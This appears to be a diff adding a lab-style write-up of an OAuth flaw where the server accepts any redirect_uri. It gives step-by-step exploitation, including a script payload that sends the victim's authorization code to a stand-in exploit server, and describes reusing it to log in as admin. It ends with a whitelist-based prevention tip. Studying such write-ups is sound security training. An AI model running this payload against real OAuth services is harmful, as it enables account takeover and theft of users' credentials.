@@ -1,0 +1,20 @@
+Vulnerability:
+	 The OAuth server accepts any redirect_uri value and blindly redirects to it.
+	
+Exploit:
+	An attacker can start the OAuth process in the victim’s browser and force the entire flow to pass through the exploit server, leaking the authorization code.
+	
+Explanation:
+	- Log in to your account then log out.
+	- Log in again and capture the request that starts the OAuth flow (GET /auth?...).
+	- Craft a page with a script that the victim’s browser will run, using your exploit server as redirect_uri:
+		<script>
+			window.location = "https://oauth-server.net/auth?client_id=???&redirect_uri=https://exploit-server.net&response_type=code&scope=openid%20profile%20email";
+		</script>
+	- Find a way to make the victim enter this page.
+	- Obsserve the victim's code token in the exploit server's logs.
+	- Use this code and send a request using it.
+	- Take the session value from the response and use it to be logged in as the admin. 
+	
+Prevention:
+	-  Validate redirect_uri against a whitelist and reject any value that does not exactly match a registered callback URL.
